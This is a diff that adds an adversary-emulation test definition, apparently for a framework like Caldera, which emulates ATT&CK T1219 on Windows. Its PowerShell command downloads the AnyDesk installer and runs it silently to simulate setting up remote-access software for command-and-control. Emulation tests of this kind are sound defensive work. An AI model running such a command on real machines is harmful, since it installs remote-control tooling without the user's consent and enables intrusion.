@@ -1,0 +1,23 @@
+- description: 'An adversary may attempt to trick the user into downloading AnyDesk
+    and use to establish C2. Download of AnyDesk installer will be at the destination
+    location and ran when sucessfully executed.
+
+    '
+  id: aada5380-e7d0-a4c7-b71f-2a324d9d5327
+  name: AnyDesk Files Detected Test on Windows
+  platforms:
+    windows:
+      psh:
+        cleanup: $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"; Remove-Item
+          $file1 -ErrorAction Ignore
+        command: 'Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe
+          https://download.anydesk.com/AnyDesk.exe; $file1 = "C:\Users\" + $env:username
+          + "\Desktop\AnyDesk.exe"; Start-Process $file1 /S; '
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
